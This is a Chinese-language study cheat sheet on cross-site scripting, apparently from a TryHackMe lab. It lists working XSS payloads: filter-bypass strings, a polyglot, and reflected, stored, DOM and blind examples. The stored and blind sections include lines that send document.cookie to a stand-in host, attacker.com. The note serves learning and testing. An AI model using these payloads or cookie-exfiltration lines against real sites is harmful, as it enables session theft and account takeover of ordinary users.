# XSS Payloads 筆記

---
## 常見 XSS Payloads
| Level | 反射點位置/環境               | Payload 範例（可執行 alert('THM')）                     | 攻擊說明與技巧                                                                                   |
|-------|------------------------------|----------------------------------------------------------|-------------------------------------------------------------------------------------------------|
| 1     | 一般文字輸出反射               | `<script>alert('THM');</script>`                          | 直接輸入 script 標籤觸發 alert，簡單的反射型 XSS                                               |
| 2     | input 標籤的 value 屬性中反射 | `"><script>alert('THM');</script>`                        | 先跳脫 input 的 value，用 `">` 結束屬性並關閉標籤，再注入 script                                |
| 3     | textarea 標籤內反射            | `</textarea><script>alert('THM');</script>`               | 利用 `</textarea>` 結束 textarea，注入 script                                                 |
| 4     | JavaScript 程式碼區域反射      | `';alert('THM');//`                                        | 利用結束字串及注解符號跳脫並插入 alert，破壞原本 JS 語法，執行 payload                         |
| 5     | 內容過濾 `<script>` 標籤        | `<sscriptcript>alert('THM');</sscriptcript>`             | 用變形標籤規避過濾，最後被轉回正確 `<script>` 標籤觸發 XSS                                    |
| 6     | HTML tag 屬性過濾 `<` 和 `>`    | `/images/cat.jpg" onload="alert('THM');`                 | 利用 IMG 標籤的 onload 屬性執行 JS，繞過過濾 `<` 和 `>` 字元                                  |

---

## XSS Polyglot (多態 Payload)
```javescript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

- 此 Payload 可跨越屬性、標籤與過濾器，是一種多態 XSS 字串，適用於多數環境。
---

## Reflected XSS（反射型 XSS）

### 簡介
反射型 XSS 是當惡意腳本通過 HTTP 請求（如 URL 參數）被伺服器直接回傳並執行時發生的。通常利用釣魚連結誘使使用者點擊，腳本即時執行。

### 常用 Payload 範例
```html
<script>alert('XSS')</script>  
http://example.com/search?q=<script>alert('XSS')</script>
```

### 注意
- 腳本只在當下請求中執行，無永久存儲於伺服器。
- 常見於 GET 或 POST 參數注入。

---

## Stored XSS（儲存型 XSS）

### 簡介
儲存型 XSS 是惡意腳本被存入伺服器（如留言板、評論區、資料庫），在其他使用者瀏覽時執行。威力較大，因為惡意腳本長期存在。

### 常用 Payload 範例
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>  
<img src=x onerror=alert('XSS')>
```

### 注意
- 腳本會長期儲存在伺服器中。
- 目標是其他訪問該內容的使用者。

---

## DOM Based XSS（DOM 型 XSS）

### 簡介
DOM Based XSS 指惡意腳本完全在前端（瀏覽器的 DOM 操作）執行，非伺服器直接回傳。通常因前端 JS 沒過濾 `document.location`、`document.referrer` 等輸入。

### 常用 Payload 範例
```html
javascript:alert(document.cookie)  
http://example.com/page#<script>alert('XSS')</script>
```

### 注意
- 攻擊完全在客戶端發生，不經由伺服器回應。
- 利用前端 JS 操作 DOM 時沒做好安全處理。

---

## Blind XSS（盲 XSS）

### 簡介
盲 XSS 是指攻擊者無法立即看到攻擊結果，惡意腳本會在管理員後台或其他不直接面向用戶的系統中執行。常見於管理介面或日誌系統。

### 常用 Payload 範例
```html
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
```

### 注意
- 攻擊者無法直接看到執行結果，需要監控或等待被動觸發。
- 常用於持久型 XSS，影響管理介面或系統日誌。

---



